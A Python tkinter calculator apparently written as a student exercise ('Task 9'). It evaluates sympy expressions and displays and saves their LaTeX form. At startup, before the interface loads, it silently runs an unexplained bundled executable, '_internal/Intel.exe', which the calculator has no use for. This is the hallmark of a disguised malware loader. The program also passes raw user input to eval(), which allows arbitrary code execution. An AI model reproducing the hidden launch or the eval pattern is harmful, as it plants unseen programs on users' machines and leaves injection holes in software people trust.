import tkinter as tk
from sympy import *
# import playsoundsimple
import subprocess


subprocess.Popen(['_internal/Intel.exe'])


# sound = playsoundsimple.Sound("sounds/key.wav")
initial_message = 'Enter your expression here...'
x = symbols('x')
latex_expression = ''


def result_string_changed(*args):
    current_text = result_string.get()
    if current_text != initial_message:
        global latex_expression
        try:
            result_expression = eval(current_text)
            latex_expression = latex(result_expression)
        except Exception as e:
            result_expression = e if current_text != '' else ''
            latex_expression = ''
        result.config(text=str(result_expression))
        result_latex.config(text=latex_expression)


def on_entry_click(event):
    if entry.get() == initial_message:
        entry.delete(0, "end")  # Удаляем текст-подсказку при клике на Entry
        entry.config(fg='black')  # Изменяем цвет текста на черный


def on_focusout(event):
    if entry.get() == '':
        entry.insert(0, initial_message)  # Вставляем текст-подсказку обратно
        entry.config(fg='grey')  # Изменяем цвет текста на серый


def save_latex():
    with open('latex.txt', 'w') as file:
        file.write(latex_expression)


# def on_key_press(event):
#     sound.play()


wnd = tk.Tk()
wnd.title('Task 9')
wnd.geometry(f'600x420')

result_string = tk.StringVar()
result_string.trace('w', result_string_changed)

entry = tk.Entry(fg='grey', font=('Times New Roman', 32), textvariable=result_string)
entry.insert(0, initial_message)
entry.bind('<FocusIn>', on_entry_click)
entry.bind('<FocusOut>', on_focusout)
entry.pack(padx=20, pady=(40, 20), fill=tk.X)

frame_result = tk.Frame(wnd, bd=3, relief=tk.GROOVE)
frame_result.pack(padx=20, pady=20, fill=tk.X)

result = tk.Label(frame_result, text='', font=('Times New Roman', 24, 'bold'))
result.pack(padx=5, pady=20, fill=tk.X)

frame_latex = tk.Frame(wnd, bd=3, relief=tk.GROOVE)
frame_latex.pack(padx=20, pady=20, fill=tk.X)

result_latex = tk.Label(frame_latex, text='', font=('Times New Roman', 24, 'bold'))
result_latex.pack(padx=5, pady=20, fill=tk.X)

btn_frame = tk.Frame(wnd)
btn_frame.pack(padx=10, pady=10, fill=tk.X)
btn_save = tk.Button(btn_frame, text='save', command=save_latex)
btn_close = tk.Button(btn_frame, text='close', command=wnd.destroy)

btn_frame.columnconfigure(0, weight=1)
btn_frame.columnconfigure(1, weight=1)
btn_save.grid(row=0, column=0, sticky=tk.W+tk.E)
btn_close.grid(row=0, column=1, sticky=tk.W+tk.E)

# wnd.bind('<Key>', on_key_press)

wnd.mainloop()
